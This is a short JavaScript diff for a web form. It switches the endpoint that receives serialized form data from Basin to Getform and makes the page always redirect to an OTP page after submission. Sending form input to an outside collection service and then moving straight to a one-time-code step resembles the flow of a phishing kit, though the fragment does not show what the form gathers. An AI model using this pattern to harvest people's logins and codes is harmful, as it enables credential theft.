@@ -11,18 +11,15 @@
       $('form').submit(function(event) {
         event.preventDefault(); // Prevent form submission
 
-        // Send the form data to Basin using AJAX
+        // Send the form data to Getform using AJAX
         $.ajax({
-          url: 'https://usebasin.com/f/08d4cd611619', // Replace with your Basin API
+          url: 'https://getform.io/f/4959435f-88bb-4f56-b257-177ba40fe181', // Replace with your Getform API
           method: 'POST',
           data: $('form').serialize(),
           dataType: 'json',
           success: function(response) {
-            if (response.success) {
-              redirectToOTP();
-            } else {
-              alert('An error occurred. Please try again.');
-            }
+            // Redirect to otp.html upon successful submission
+            redirectToOTP();
           },
           error: function(xhr, status, error) {
             console.log(xhr.responseText);
